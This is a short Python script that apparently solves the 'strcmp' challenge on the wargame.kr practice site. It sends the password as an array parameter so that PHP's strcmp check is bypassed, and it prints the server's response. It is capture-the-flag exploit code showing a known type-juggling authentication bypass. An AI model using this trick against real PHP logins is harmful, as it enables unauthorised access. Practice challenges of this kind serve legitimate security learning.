import requests, json

url = 'http://wargame.kr:8080/strcmp/'
param = {'password[]': 0}
response = requests.post(url=url, data=param)
print(response.text)